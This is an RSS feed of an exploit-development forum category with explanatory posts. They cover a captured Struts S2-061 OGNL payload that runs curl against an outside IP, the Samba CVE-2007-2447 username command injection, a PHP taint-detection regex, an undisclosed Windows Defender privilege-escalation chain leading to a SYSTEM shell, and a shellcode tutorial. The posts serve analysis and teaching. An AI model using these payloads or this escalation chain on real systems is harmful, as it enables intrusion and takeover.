<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:discourse="http://www.discourse.org/" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>Exploit Development - 0x00sec - The Home of the Hacker</title>
    <link>https://d.clarkee.co.uk/c/exploit-development/53</link>
    <description>Topics in the &#39;Exploit Development&#39; category </description>
    
      <lastBuildDate>Wed, 03 Feb 2021 13:22:43 +0000</lastBuildDate>
      <atom:link href="https://d.clarkee.co.uk/c/exploit-development/53.rss" rel="self" type="application/rss+xml" />
        <item>
          <title>Relation between RE &amp; exploit development</title>
          <dc:creator><![CDATA[alexa]]></dc:creator>
          <category>Exploit Development</category>
          <description><![CDATA[
            <p>hey everyone, hope your good<br>
i just wanted to ask about this topic. although i know that reverse engineering is a must before going into exploitation and exploit writing …<br>
but in case we already know the vulnerability, and we know what is it, from going to places like :<br>
<a href="https://www.cvedetails.com/" class="onebox" target="_blank" rel="noopener nofollow ugc">https://www.cvedetails.com/</a><br>
<a href="https://www.exploit-db.com/" class="onebox" target="_blank" rel="noopener nofollow ugc">https://www.exploit-db.com/</a></p><aside class="onebox allowlistedgeneric">
  <header class="source">
      <img src="https://0x00sec.s3.amazonaws.com/original/3X/0/a/0ad39240157227cd6349ad14502729ac756d6a7e.png" class="site-icon" width="32" height="32">
      <a href="https://www.tenable.com/cve/search" target="_blank" rel="noopener nofollow ugc">tenable.com</a>
  </header>
  <article class="onebox-body">
    <img src="" class="thumbnail" width="" height="">

<h3><a href="https://www.tenable.com/cve/search" target="_blank" rel="noopener nofollow ugc">CVE Search</a></h3>

<p>Search over 100,000 CVEs covering local and remote flaws.</p>


  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>
<p><a href="https://cve.mitre.org/" class="onebox" target="_blank" rel="noopener nofollow ugc">https://cve.mitre.org/</a><br>
<a href="https://nvd.nist.gov/" class="onebox" target="_blank" rel="noopener nofollow ugc">https://nvd.nist.gov/</a><br>
and much more…<br>
can we just pass reverse engineering in this situation ? or even with reference to these websites we still need to reverse engineer something here and there and figure it out ?<br>
it is not discovering a new bug but just exploiting a known one. but if we must learn reverse engineering then what is the most required practice for it (to build exploits for vulnerabilities that are known), since right now i am cracking some challenges on crackmes.one and i don’t think this helps a lot.</p>
<p>thank you guys, and i hope you got the point.</p>
            <p><small>11 posts - 4 participants</small></p>
            <p><a href="https://d.clarkee.co.uk/t/relation-between-re-exploit-development/24811">Read full topic</a></p>
          ]]></description>
          <link>https://d.clarkee.co.uk/t/relation-between-re-exploit-development/24811</link>
          <pubDate>Wed, 03 Feb 2021 13:22:43 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">d.clarkee.co.uk-topic-24811</guid>
          <source url="https://d.clarkee.co.uk/t/relation-between-re-exploit-development/24811.rss">Relation between RE &amp; exploit development</source>
        </item>
        <item>
          <title>The S2-061 Struts remote code execution vulnerability (CVE-2020-17530) in the WILD</title>
          <dc:creator><![CDATA[Ishma_Frcher5]]></dc:creator>
          <category>Exploit Development</category>
          <description><![CDATA[
            <p>S2-061 Struts remote code execution vulnerability (CVE-2020-17530) on December 08, 2020 by apache and its marked “difficult to weaponize” by most sites i’ve checked after finding this request. Today looking at my server logs I found a ‘GET’ request with these:(I wont remove anything it might help a reseacher make sense of it)</p>
<blockquote>
<p><code>"GET /?id=%25%7B%28%27Powered_by_Unicode_Potats0%2Cenjoy_it%27%29.%28%23UnicodeSec+%3D+%23application%5B%27org.apache.tomcat.InstanceManager%27%5D%29.%28%23potats0%3D%23UnicodeSec.newInstance%28%27org.apache.commons.collections.BeanMap%27%29%29.%28%23stackvalue%3D%23attr%5B%27struts.valueStack%27%5D%29.%28%23potats0.setBean%28%23stackvalue%29%29.%28%23context%3D%23potats0.get%28%27context%27%29%29.%28%23potats0.setBean%28%23context%29%29.%28%23sm%3D%23potats0.get%28%27memberAccess%27%29%29.%28%23emptySet%3D%23UnicodeSec.newInstance%28%27java.util.HashSet%27%29%29.%28%23potats0.setBean%28%23sm%29%29.%28%23potats0.put%28%27excludedClasses%27%2C%23emptySet%29%29.%28%23potats0.put%28%27excludedPackageNames%27%2C%23emptySet%29%29.%28%23exec%3D%23UnicodeSec.newInstance%28%27freemarker.template.utility.Execute%27%29%29.%28%23cmd%3D%7B%27curl+93.189.44.137%2Fssa%27%7D%29.%28%23res%3D%23exec.exec%28%23cmd%29%29%7D HTTP/1.0"</code></p>
</blockquote>
<p><em>Decoding the URL</em></p>
<blockquote>
<p><code>{('Powered_by_Unicode_Potats0,enjoy_it').(#UnicodeSec = #application['org.apache.tomcat.InstanceManager']).(#potats0=#UnicodeSec.newInstance('org.apache.commons.collections.BeanMap')).(#stackvalue=#attr['struts.valueStack']).(#potats0.setBean(#stackvalue)).(#context=#potats0.get('context')).(#potats0.setBean(#context)).(#sm=#potats0.get('memberAccess')).(#emptySet=#UnicodeSec.newInstance('java.util.HashSet')).(#potats0.setBean(#sm)).(#potats0.put('excludedClasses',#emptySet)).(#potats0.put('excludedPackageNames',#emptySet)).(#exec=#UnicodeSec.newInstance('freemarker.template.utility.Execute')).(#cmd={'curl 93.189.44.137/ssa'}).(#res=#exec.exec(#cmd))}</code></p>
</blockquote>
<p>Decoding it and a little google search I found this chinese site that had described the POC with example of the real exploitation “<a href="https://www.cnblogs.com/potatsoSec/p/14111163.html" class="inline-onebox" rel="noopener nofollow ugc">Struts2 s2-061 Poc分析 - potatso - 博客园</a>”. With the site having the name “potatso” and the exploit having “potats0” is it a coincidence or is it a script-kiddie who just copied the code and tried just hitting anything online?? The IP 93[.]189[.]44[.]137 which curl calls is from Russia though. Researching on the exploit its marked “difficult to weaponize”. I still dont know if this is necessary  or it might help but Id say just patch  even if its marked with low risk.</p>
            <p><small>2 posts - 2 participants</small></p>
            <p><a href="https://d.clarkee.co.uk/t/the-s2-061-struts-remote-code-execution-vulnerability-cve-2020-17530-in-the-wild/24324">Read full topic</a></p>
          ]]></description>
          <link>https://d.clarkee.co.uk/t/the-s2-061-struts-remote-code-execution-vulnerability-cve-2020-17530-in-the-wild/24324</link>
          <pubDate>Tue, 22 Dec 2020 21:10:22 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">d.clarkee.co.uk-topic-24324</guid>
          <source url="https://d.clarkee.co.uk/t/the-s2-061-struts-remote-code-execution-vulnerability-cve-2020-17530-in-the-wild/24324.rss">The S2-061 Struts remote code execution vulnerability (CVE-2020-17530) in the WILD</source>
        </item>
        <item>
          <title>Regex for Easy 0days</title>
          <dc:creator><![CDATA[hunter]]></dc:creator>
          <category>Exploit Development</category>
          <description><![CDATA[
            <p>Here is a regex I wrote to detect if a PHP code is calling dangerous functions with tainted variables.</p>
<blockquote>
<p>/(\$[a-zA-Z0-9]+) ?=[^;]*\$_(GET|POST|REQUEST)[^;]*;.*(shell_exec|system|exec|passthru|eval)\([^\)]*\1[^\)]*\)/gms</p>
</blockquote>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/f/f7cc312555538252f269c68e7ae09a3bd38a98d6.jpeg" data-download-href="/uploads/short-url/zm7pHiYdRPXXeHvNzAaLGSPEyWi.jpeg?dl=1" title="IMG_20200906_101420_756"><img src="/uploads/default/optimized/2X/f/f7cc312555538252f269c68e7ae09a3bd38a98d6_2_690x326.jpeg" alt="IMG_20200906_101420_756" data-base62-sha1="zm7pHiYdRPXXeHvNzAaLGSPEyWi" width="690" height="326" srcset="/uploads/default/optimized/2X/f/f7cc312555538252f269c68e7ae09a3bd38a98d6_2_690x326.jpeg, /uploads/default/optimized/2X/f/f7cc312555538252f269c68e7ae09a3bd38a98d6_2_1035x489.jpeg 1.5x, https://0x00sec.s3.amazonaws.com/original/2X/f/f7cc312555538252f269c68e7ae09a3bd38a98d6.jpeg 2x"></a></div><p></p>
            <p><small>5 posts - 3 participants</small></p>
            <p><a href="https://d.clarkee.co.uk/t/regex-for-easy-0days/23016">Read full topic</a></p>
          ]]></description>
          <link>https://d.clarkee.co.uk/t/regex-for-easy-0days/23016</link>
          <pubDate>Sun, 06 Sep 2020 07:19:28 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">d.clarkee.co.uk-topic-23016</guid>
          <source url="https://d.clarkee.co.uk/t/regex-for-easy-0days/23016.rss">Regex for Easy 0days</source>
        </item>
        <item>
          <title>CVExplained - CVE-2007-2447</title>
          <dc:creator><![CDATA[nikkiofthenet]]></dc:creator>
          <category>Exploit Development</category>
          <description><![CDATA[
            <p>Summary and TLDR at the bottom.</p>
<p>CVE-2007–2447 allows remote attackers to run commands via the username parameter in Samba 3.0.0–3.0.25rc3. Below is the POC seen in most scripts.</p>
<blockquote>
<p>/=`nohup {payload}`</p>
</blockquote>
<p>You can send this text as the username via the “logon” command in smbclient and your payload is executed. (Note: The “=” is not actually required to run this exploit. I am not sure why it is in most POCs.) Interestingly, if you send the username via impacket or another script, the “/” isn’t required! I’ll explain later in this post why that is. Below is a script modified by <a class="mention" href="https://d.clarkee.co.uk/u/jarvis">@Jarvis</a> that shows there is no need for the “/”.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/7/742138862ae421c44e9f06e6532c7af0f0bae7c0.png" data-download-href="/uploads/short-url/gzkyPz7KSjrTbW0Fj1R8l3aCcWQ.png?dl=1" title="exploitimpacket" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/2X/7/742138862ae421c44e9f06e6532c7af0f0bae7c0.png" alt="exploitimpacket" data-base62-sha1="gzkyPz7KSjrTbW0Fj1R8l3aCcWQ" width="477" height="228"></a></div><br>
Now that we know how to exploit this CVE, let’s dig into how it works!<p></p>
<p>After a bit of investigation I found two files that are important to look at:</p>
<ul>
<li>source/lib/smbrun.c</li>
<li>source/smbd/map_username.c</li>
</ul>
<p>Looking into map_username.c we find this little blob of code.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/0/0c5991e779f11e0fefbaf1f8965b99cd57a5eea2.png" data-download-href="/uploads/short-url/1LfDcLszSCvu8ODZAG5NOXPfvfI.png?dl=1" title="mapusername" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/0/0c5991e779f11e0fefbaf1f8965b99cd57a5eea2_2_517x235.png" alt="mapusername" data-base62-sha1="1LfDcLszSCvu8ODZAG5NOXPfvfI" width="517" height="235" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/0/0c5991e779f11e0fefbaf1f8965b99cd57a5eea2_2_517x235.png, https://0x00sec.s3.amazonaws.com/optimized/2X/0/0c5991e779f11e0fefbaf1f8965b99cd57a5eea2_2_775x352.png 1.5x, https://0x00sec.s3.amazonaws.com/optimized/2X/0/0c5991e779f11e0fefbaf1f8965b99cd57a5eea2_2_1034x470.png 2x"></a></div><br>
From this we can see that the username we send is combined with the script that is set in the smb.conf file to give us a string such as<p></p>
<blockquote>
<p>/etc/samba/script/usermap.sh “Jimmy”</p>
</blockquote>
<p>That string is then sent to the smbrun function. Taking a quick peek at the smbrun function reveals that it has been turned into a wrapper for a new smbrun_internal function with a hard coded parameter.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/d/db538e6a249785957a743647cc578a340a3fde57.png" data-download-href="/uploads/short-url/vifAfakHK6imyBUEDmvUcurArFJ.png?dl=1" title="smbrun" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/d/db538e6a249785957a743647cc578a340a3fde57_2_517x138.png" alt="smbrun" data-base62-sha1="vifAfakHK6imyBUEDmvUcurArFJ" width="517" height="138" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/d/db538e6a249785957a743647cc578a340a3fde57_2_517x138.png, https://0x00sec.s3.amazonaws.com/optimized/2X/d/db538e6a249785957a743647cc578a340a3fde57_2_775x207.png 1.5x, https://0x00sec.s3.amazonaws.com/optimized/2X/d/db538e6a249785957a743647cc578a340a3fde57_2_1034x276.png 2x"></a></div><p></p>
<p>Taking a peek at the smbrun_internal function we find that the hardcoded parameter in smbrun is the sanitize parameter! We also see that previously, the smbrun function sent unsanitized data to the execl function.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/2/27a6c3eaf1e33975e433ee35491f374c6e5a49ad.png" data-download-href="/uploads/short-url/5ELUGOhNAjTPJu25m5LAmgrhlMh.png?dl=1" title="smbruninternal" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/2/27a6c3eaf1e33975e433ee35491f374c6e5a49ad_2_690x473.png" alt="smbruninternal" data-base62-sha1="5ELUGOhNAjTPJu25m5LAmgrhlMh" width="690" height="473" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/2/27a6c3eaf1e33975e433ee35491f374c6e5a49ad_2_690x473.png, https://0x00sec.s3.amazonaws.com/optimized/2X/2/27a6c3eaf1e33975e433ee35491f374c6e5a49ad_2_1035x709.png 1.5x, https://0x00sec.s3.amazonaws.com/original/2X/2/27a6c3eaf1e33975e433ee35491f374c6e5a49ad.png 2x"></a></div><p></p>
<p>This is the root cause of our vulnerability. A normal logon request would look like this to execl:</p>
<blockquote>
<p>/bin/sh sh -c /etc/samba/scripts/mapscript.sh “Jimmy”</p>
</blockquote>
<p>However if we were to inject the username with our exploit this is what would be passed to execl:</p>
<blockquote>
<p>/bin/sh sh -c /etc/samba/scripts/mapscript.sh “`nohup {payload}`”</p>
</blockquote>
<p>Cool! So a relatively simple exploit. We abuse backticks in unsanitized text that is passed to sh to gain command execution. But what happened to the forward slash? Long story short, the “/” acts as a delimiter for the domain field in smbclient. Below is a side by side comparison of an attempt to run this exploit with and without the “/” (Left without the “/”, right with the “/”)</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/f/ff7abcfc8dec7688f404c1ee21588995384d6e02.png" data-download-href="/uploads/short-url/As4IFf4QVLs0yXwSP0Ma48YLKkG.png?dl=1" title="domainfieldskip" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/f/ff7abcfc8dec7688f404c1ee21588995384d6e02_2_690x330.png" alt="domainfieldskip" data-base62-sha1="As4IFf4QVLs0yXwSP0Ma48YLKkG" width="690" height="330" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/f/ff7abcfc8dec7688f404c1ee21588995384d6e02_2_690x330.png, https://0x00sec.s3.amazonaws.com/optimized/2X/f/ff7abcfc8dec7688f404c1ee21588995384d6e02_2_1035x495.png 1.5x, https://0x00sec.s3.amazonaws.com/optimized/2X/f/ff7abcfc8dec7688f404c1ee21588995384d6e02_2_1380x660.png 2x"></a></div><p></p>
<p><strong>Summary/TLDR</strong><br>
CVE-2007–2447 is a remote command injection vulnerability in the username parameter of Samba 3.0.0–3.0.25rc3 caused by a lack of input sanitization. The reason for the “/” character in the exploit is to separate the domain field and the username field in smbclient. I do not know the reason for the “=” character in most POCs.</p>
<p><strong>Credits</strong><br>
<a class="mention" href="https://d.clarkee.co.uk/u/jarvis">@Jarvis</a> - Modified impacket script to exploit CVE-2007-2447<br>
Amriunix - Helped me understand why the “/” was needed and also let me know that the “=” wasn’t required.</p>
<p>This is my first “writeup” of sorts, I appreciate any and all feedback! Hopefully you learned something <img src="https://d.clarkee.co.uk/images/emoji/twitter/slight_smile.png?v=15" title=":slight_smile:" class="emoji" alt=":slight_smile:" loading="lazy" width="20" height="20"></p>
            <p><small>3 posts - 2 participants</small></p>
            <p><a href="https://d.clarkee.co.uk/t/cvexplained-cve-2007-2447/22748">Read full topic</a></p>
          ]]></description>
          <link>https://d.clarkee.co.uk/t/cvexplained-cve-2007-2447/22748</link>
          <pubDate>Mon, 17 Aug 2020 23:24:32 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">d.clarkee.co.uk-topic-22748</guid>
          <source url="https://d.clarkee.co.uk/t/cvexplained-cve-2007-2447/22748.rss">CVExplained - CVE-2007-2447</source>
        </item>
        <item>
          <title>Windows Defender AV Zero Day Vulnerability</title>
          <dc:creator><![CDATA[bruh11]]></dc:creator>
          <category>Exploit Development</category>
          <description><![CDATA[
            <p><strong>Windows Defender Elevation Of Privileges Vulnerability</strong></p>
<p>Well first of all why?</p>
<p>Cause Microsoft stopped their shitty bug bounty program for windows eop bugs so I don’t have any interest to report them to the vendor</p>
<p>In the last decade I was looking for windows defender bugs but I was just spending time I thought MS just made the perfect av, until I saw <a href="https://portal.msrc.microsoft.com/en-us/security-guidance/advisory/CVE-2020-1170" rel="noopener nofollow ugc">this</a></p>
<p>However, this is the description From Microsoft:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/1/14009a93a9f8fe62bef735a5c3756238e617d895.png" alt="image" data-base62-sha1="2QWQgN7cg8V2iI7N4YtdRIBB2h7" width="601" height="190"><br>
The guy who’s acknowledged is usually disclosing his bugs so I was waiting for him this time to see if I can bypass the security patch.<br>
and then he posted his <a href="https://itm4n.github.io/cve-2020-1170-windows-defender-eop/" rel="noopener nofollow ugc">article</a>  so when I read his write up it seemed bypassable to me (if you’re reading this it4mn THANK YOU !).<br>
Let’s get into the bug, on a default configuration there’s a file in <code>c:\windows\temp\mpcmdrun.log</code> this file is used for event logging that happen in <code>mpcmdrun.log</code> process, which runs in the context of the local system (highest privileges that exist on windows), as <code>it4mn</code> said when the log file should reach   <strong>16,777,216 bytes (16MB)</strong> in order to trigger the bug let’s thing on process monitor, you can download it <a href="https://download.sysinternals.com/files/ProcessMonitor.zip" rel="noopener nofollow ugc">here</a></p>
<p>Okay Let’s try to reproduce the bug<br>
<img src="https://0x00sec.s3.amazonaws.com/original/2X/0/0c735d6ea757736c8f863b8d3d0372e7247a4a90.png" alt="image" data-base62-sha1="1M8TFJlAM9vuhBRffucZBxGWojC" width="602" height="314"><br>
Let’s see what happens on procmon<br>
<img src="https://0x00sec.s3.amazonaws.com/original/2X/c/c7bbdbe20518d7d437ea5a7abde92ac40444bf82.png" alt="image" data-base62-sha1="suVv9Ano6TJHNxeYIQNW8mUbwvo" width="601" height="260"><br>
As you can see the patch seems to be working as it supposed to be, you can see the <code>MpCmdRun.exe</code> handling the junction with <code>GENERIC_ALL</code> access and then he execute the control code <code>FSCTL_GET_REPARSE_POINT</code> and <code>FSCTL_DELETE_REPARSE_POINT</code> both result in success, the get reparse point control is simply check if the directory is a reparse point but the control code delete reparse point will attempt to convert the junction <code>mpcmdrun.log.bak</code> to a directory then it proceeds to delete it. Seems to be patched correctly! but there’s still something wrong with the patch, what if we created a junction inside the mpcmdrun.log.bak ? ex: mpcmdrun.log.bak\test, let’s check it out</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/b/b5d00aca4f3f283035debc853cb6a684395bf589.jpeg" alt="image" data-base62-sha1="pWo9k8KhqT2kp6GQMevroBqAwUp" width="601" height="362"><br>
It worked we now have an arbitrary file deletion issue in windows defender.</p>
<p>Okay let’s do some more damage, let’s go for a system shell</p>
<p><strong>NOTE: this method will work on windows 10 only</strong></p>
<p>Let’s see what privileges are given to <code>MpCmdRun.exe</code> we can inspect them in process explorer<br>
<img src="https://0x00sec.s3.amazonaws.com/original/2X/1/1b5f45c4725366527302d6365fb0587b37668603.jpeg" alt="image" data-base62-sha1="3U90KIywm4wfScM9JRSBacVdngv" width="601" height="338"><br>
It seems look like <code>mpcmdrun</code> is child process from <code>MsMpEng.exe</code> which is actually the AV<br>
Let’s check the AV:<br>
<img src="https://0x00sec.s3.amazonaws.com/original/2X/e/e26634e01e1b51aafb22d357474cbc2a49e90565.png" alt="image" data-base62-sha1="wiOSRiEx5t7UvVT7cE2VrCrjLFz" width="601" height="342"><br>
It ran in the context of <code>NT AUTHORITY\SYSTEM</code> but what about other privileges in the token ?<br>
</p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/c/c370a2594619aa24f275d2eec7ca3ac7b8de0c8a.png" data-download-href="/uploads/short-url/rSWqjb2Br9JqLTb57I7QFeMW5Ae.png?dl=1" title="image" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/2X/c/c370a2594619aa24f275d2eec7ca3ac7b8de0c8a.png" alt="image" data-base62-sha1="rSWqjb2Br9JqLTb57I7QFeMW5Ae" width="346" height="500" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/c/c370a2594619aa24f275d2eec7ca3ac7b8de0c8a_2_10x10.png"></a></div><br>
The <code>SeRestorePrivilege</code> seems to be enabled this happen because of the inherit token of <code>MsMpEng.exe</code><br>
This seems to be destructive, this privilege will allow its owner to delete any file even if it isn’t allowed to do so the ACL.<br>
<img src="https://0x00sec.s3.amazonaws.com/original/2X/9/94e01fef4acfa53e834407c894dde3fc0bc7277d.png" alt="image" data-base62-sha1="lf0QK0qkhOPHanBlUUPOgxQztcp" width="601" height="219"><br>
In this case we will have the ability to hijack a service which we will target the Windows Media Player Network Service which is by default located on <code>C:\Program Files\Windows Media Player\wmpnetwk.exe</code>, this file is protected by <code>NT SERVICE\TRUSTEDINSTALLER</code> this mitigation protected such folders from being deleted from a privileged process (such as <code>administrators</code> or <code>SYSTEM</code>) and then here’s the roll of having the <code>SeRestorePrivilege</code> Enabled this will allow us to bypass this mitigation so we can clean the entire directory <code>C:\Program Files\Windows Media Player</code>, However the Windows Media Player Network Service is on demand service start in windows 10 and it’s ACL allow INTERACTIVE group to start it we can inspect such services detail in process hacker<br>
<img src="https://0x00sec.s3.amazonaws.com/original/2X/6/6e6801236bca76a66922fd6e486f99012a7eb45f.png" alt="image" data-base62-sha1="fKHlIm6DgJb37oM6hPHHXYNqOaH" width="448" height="471"><br>
<img src="https://0x00sec.s3.amazonaws.com/original/2X/7/747a0dde74a1c21e1e261e919bd8ee4d71a2fccc.png" alt="image" data-base62-sha1="gCoSXsQTESmJGoVlJBwBljpyTp2" width="446" height="468"><br>
Those are some good info so if we have the ability to recreate <code>C:\Program Files\Windows Media Player</code> directory we can hijack the service with a malicious one, luckily and a big thanks to jonasLyk for providing a technique to allow arbitrary directory creation from an arbitrary file deletion you can see the article <a href="https://secret.club/2020/04/23/directory-deletion-shell.html" rel="noopener nofollow ugc">here</a><p></p>
<p>The technique is simple if we deleted the entire <code>C:\ProgramData\Microsoft\Windows\WER</code> directory, the windows error reporting tool will recreate it for us and then  create <code>C:\ProgramData\Microsoft\Windows\WER\Temp</code> allowing authenticated Users to have write&amp;delete access on both WER and Temp directories<br>
<img src="https://0x00sec.s3.amazonaws.com/original/2X/b/b1eab480c73fbbb0d2dfbdc0b868f668a5ab7b0d.png" alt="image" data-base62-sha1="pnVmFo4izoV2oIpRpoV6gxK5bWZ" width="601" height="202"><br>
which will allow user to abuse the Temp folder creation by creating a reparse point from <code>C:\ProgramData\Microsoft\Windows\WER</code> to <code>\RPC CONTROL\</code> and then creating a symlink from <code>\RPC CONTROL\Temp</code> -&gt; <code>C:\Program Files\Windows Media Player</code> so as soon we rerun the scheduled task <code>\Microsoft\Windows\Windows Error Reporting\QueueReporting</code> the <code>C:\Program Files\Windows Media Player</code> folder will be created with new rights allowing authenticated user to write on it so we can write a payload and then start the service the only problem we will have is the gained privileges<br>
<img src="https://0x00sec.s3.amazonaws.com/original/2X/6/6e6801236bca76a66922fd6e486f99012a7eb45f.png" alt="image" data-base62-sha1="fKHlIm6DgJb37oM6hPHHXYNqOaH" width="448" height="471"></p>
<p>As you can see here we aren’t running as <code>NT AUTHORITY\SYSTEM</code> instead the service is ran as <code>NT AUTHORITY\Network Service</code> this service account doesn’t have full control over the system which is an issue we can easily address, Thanks again to it4mn for his awesome blog about elevating from network service to system you can find it <a href="https://itm4n.github.io/printspoofer-abusing-impersonate-privileges" rel="noopener nofollow ugc">here</a><br>
You can find the PoC <a href="https://github.com/klinix5/WinDefend_ZeroDay" rel="noopener nofollow ugc">here</a> it’s a chained one so it’s supposed to spawn a system shell when it succeed</p>
<p><strong>NOTES</strong></p>
<ul>
<li>exploiting the issue will take up to 35min according to clement we need to fill <code>mpcmdrun.log</code> with 16.5mb data in order to trigger the issue.</li>
<li>the Poc will work only on windows 10 and I didn’t tested on windows server.<br>
and lastly Shootout To <a class="mention" href="https://d.clarkee.co.uk/u/jeff">@jeff</a>
</li>
</ul>
            <p><small>4 posts - 4 participants</small></p>
            <p><a href="https://d.clarkee.co.uk/t/windows-defender-av-zero-day-vulnerability/22258">Read full topic</a></p>
          ]]></description>
          <link>https://d.clarkee.co.uk/t/windows-defender-av-zero-day-vulnerability/22258</link>
          <pubDate>Wed, 15 Jul 2020 15:55:38 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">d.clarkee.co.uk-topic-22258</guid>
          <source url="https://d.clarkee.co.uk/t/windows-defender-av-zero-day-vulnerability/22258.rss">Windows Defender AV Zero Day Vulnerability</source>
        </item>
        <item>
          <title>Null Terminated Programming 101 - x64</title>
          <dc:creator><![CDATA[x24whoami24]]></dc:creator>
          <category>Exploit Development</category>
          <description><![CDATA[
            <h1>Null Terminated Programming 101 - x64</h1>
<p><strong></strong></p><div class="lightbox-wrapper"><strong><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/e/e52e1dc9cf922b754575f507d0c9794ed51f47c6.png" data-download-href="/uploads/short-url/wHq8XLq2WAXGREaOjSSi5gBi7b0.png?dl=1" title=""><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/e/e52e1dc9cf922b754575f507d0c9794ed51f47c6_2_602x339.png" alt="" data-base62-sha1="wHq8XLq2WAXGREaOjSSi5gBi7b0" width="602" height="339" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/e/e52e1dc9cf922b754575f507d0c9794ed51f47c6_2_602x339.png, /uploads/default/original/2X/e/e52e1dc9cf922b754575f507d0c9794ed51f47c6.png 1.5x, /uploads/default/original/2X/e/e52e1dc9cf922b754575f507d0c9794ed51f47c6.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/e/e52e1dc9cf922b754575f507d0c9794ed51f47c6_2_10x10.png"></a></strong></div><p></p>
<h2>Preface</h2>
<p>Everyone, class is in session! please take your seat as we are about to start.</p>
<p>Today we’re going to dive deep into a magnificent assembly language - x64.</p>
<p>I chose this excellent language for this class because of its extreme use in personal computers and because it’s known by most researchers.</p>
<p>When speaking a language, we often use synonyms while speaking about a subject, this makes the conversation more intelligent and exciting for everyone involved.</p>
<p>Even now we just saw the use of them in the way I described x64 as magnifect and excellent. Two different words which mean the same thing.</p>
<p>When writing shellcode, we sometimes need to perform something similar, this is mainly because in some  cases, the way we input our shellcode using our exploit will have a limitation of sort.</p>
<p>Some examples:</p>
<p>1.No null bytes in case of strcpy, which stops copying after it encounters a null byte</p>
<p>2.Size limit of on how much shellcode we can put</p>
<p>3.Only alphanumeric characters are copied</p>
<p>These conditions cause us to develop different methods to write our shellcode in a way that it will implement the same logic but still be able to bypass the limitations imposed by the program</p>
<p>Today we will attempt to solve case <span class="hashtag">#1</span> by learning about techniques that we can use to tackle this issue,<br>
these techniques are often called Null Terminated Programming, as they allow us to compile assembly code that will not contain any null bytes in the final shellcode.</p>
<p>Please note that some of the techniques described here will probably be relevant for different assembly languages as well so i’ll leave it as an exercise for the reader to check these techniques on a different language.</p>
<p><strong>Recommended Prerequisites:</strong></p>
<ul>
<li>x64/x86 assembly  knowledge</li>
<li>Basic knowledge on building shellcodes</li>
</ul>
<h2>Setup</h2>
<p>For our setup, i’m using a <a href="https://github.com/x24whoamix24/make_shellcode_linux" rel="noopener nofollow ugc">script</a> i wrote for compiling shellcode for x86/x64</p>
<p>which we can also use to compile our shellcode.</p>
<p>next, we can use this <a href="https://github.com/mads256h/shellrun" rel="noopener nofollow ugc">repository</a> in order to debug and run our shellcode nicely</p>
<h2>Quick Refreshment on x64 syscalls</h2>
<p>In x64 linux systems, Each syscall has a special number that represents it, when we want to perform a call to a certain syscall we first need to store the correct syscall number in RAX, then we pass the arguments 1-6 to the syscall using the registries RDI, RSI, RDX, RCX, R8, R9 accordingly.</p>
<p>Finally, we use the instruction syscall which performs the syscall itself and stores the return value in RAX.</p>
<p>The full x64 syscall map table can be found <a href="https://filippo.io/linux-syscall-table/" rel="noopener nofollow ugc">here</a></p>
<p>Let’s have a look at this simple assembly code i wrote named printf_file.asm:</p>
<pre><code class="lang-auto">
SYS_READ equ 0

SYS_WRITE equ 1

SYS_OPEN equ 2 

SYS_EXIT equ 60

AMOUNT_TO_READ equ 16 

global _start

section .text

_start:

  jmp get_file_path 

  continue:

  

  ; syscall to open the file

  mov eax, SYS_OPEN

  pop rdi ; pop address of string to rdi

  mov rsi, 0 ; set O_RDONLY flag

  syscall

    

  ; syscall to read file

  sub sp, 0xff

  lea rsi, [rsp]

  

  ; syscall to write file contents to stdout  

  mov rdi, rax ; use the returned fd

  mov rdx, AMOUNT_TO_READ; amount to read

